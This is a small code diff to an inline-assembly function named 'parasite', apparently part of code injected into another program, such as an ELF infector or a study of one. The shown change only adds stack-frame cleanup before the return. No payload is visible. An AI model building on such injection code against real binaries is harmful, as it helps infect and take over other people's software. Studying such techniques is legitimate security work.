@@ -22,6 +22,8 @@ void parasite()
          "add $0x18, %eax\n"
          "movl %eax, 0x44444444(%eax)\n"
          "popa\n"
+		 "movl %ebp, %esp\n"
+		 "pop %ebp\n"
          "ret\n"
          "b1:\n"
          "jmp b0\n"
